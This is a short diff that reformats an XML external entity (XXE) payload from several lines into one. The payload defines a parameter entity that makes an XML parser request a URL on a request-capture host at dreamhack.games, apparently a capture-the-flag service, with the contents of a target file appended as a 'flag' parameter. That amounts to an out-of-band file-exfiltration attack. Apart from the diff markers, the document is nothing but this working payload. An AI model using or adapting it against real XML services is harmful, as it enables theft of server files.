@@ -1,3 +1,1 @@
-<!ENTITY %run "
-    <!ENTITY &#x25; result SYSTEM 'https://pvsurew.request.dreamhack.games/?flag=%file;'>
-"> %run; %result;
+<!ENTITY % run "<!ENTITY &#x25; result SYSTEM 'https://pvsurew.request.dreamhack.games/?flag=%file;'>"> %run; %result;
